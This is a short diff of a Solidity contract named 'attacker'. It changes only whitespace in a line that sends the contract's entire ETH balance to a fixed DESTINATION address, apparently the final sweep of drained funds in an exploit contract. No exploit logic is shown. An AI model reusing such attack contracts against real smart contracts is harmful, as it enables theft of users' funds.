@@ -22,7 +22,7 @@ contract attacker {
         }
 
         if (address(this).balance > 0) {
-            (bool success, ) = DESTINATION.call{value: address(this).balance}("");
+            (bool success,) = DESTINATION.call{value: address(this).balance}("");
             require(success, "ETH transfer failed");
         }
     }
